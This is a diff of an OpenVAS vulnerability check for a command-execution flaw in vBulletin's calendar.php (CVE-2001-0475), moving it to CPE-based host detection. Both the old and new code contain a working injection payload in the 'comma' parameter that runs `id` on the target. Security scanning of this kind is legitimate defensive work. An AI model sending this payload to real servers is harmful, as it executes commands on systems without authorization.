@@ -1,5 +1,4 @@
 # OpenVAS Vulnerability Test
-# $Id: vbulletin_calender_command_execution.nasl 11556 2018-09-22 15:37:40Z cfischer $
 # Description: vBulletin's Calendar Command Execution Vulnerability
 #
 # Authors:
@@ -22,11 +21,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 #
 
+CPE = "cpe:/a:vbulletin:vbulletin";
+
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.11179");
-  script_version("2019-04-10T13:42:28+0000");
-  script_tag(name:"last_modification", value:"2019-04-10 13:42:28 +0000 (Wed, 10 Apr 2019)");
+  script_version("2019-09-27T07:10:39+0000");
+  script_tag(name:"last_modification", value:"2019-09-27 07:10:39 +0000 (Fri, 27 Sep 2019)");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(2474);
   script_cve_id("CVE-2001-0475");
@@ -38,7 +39,7 @@ if(description)
   script_family("Web application abuses");
   script_dependencies("vbulletin_detect.nasl");
   script_require_ports("Services/www", 80);
-  script_mandatory_keys("vBulletin/installed");
+  script_mandatory_keys("vbulletin/detected");
 
   script_xref(name:"URL", value:"http://www.securiteam.com/securitynews/5IP0B203PI.html");
 
@@ -58,23 +59,20 @@ if(description)
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("host_details.inc");
 
-port = get_http_port(default:80);
-
-install = get_kb_item("www/" + port + "/vBulletin");
-if(!install)
+if(!port = get_app_port(cpe:CPE))
   exit(0);
 
-matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
-if(matches[2]) {
+if(!dir = get_app_location(cpe:CPE, port:port))
+  exit(0);
 
-  dir = matches[2];
+if(dir == "/")
+  dir = "";
 
-  http_check_remote_code(unique_dir:dir,
-                         check_request:"/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
-                         check_result:"uid=[0-9]+.*gid=[0-9]+.*",
-                         command:"id");
-  exit(99);
-}
+http_check_remote_code(unique_dir:dir,
+                       check_request:"/calendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22",
+                       check_result:"uid=[0-9]+.*gid=[0-9]+.*",
+                       command:"id");
 
-exit(0);
+exit(99);
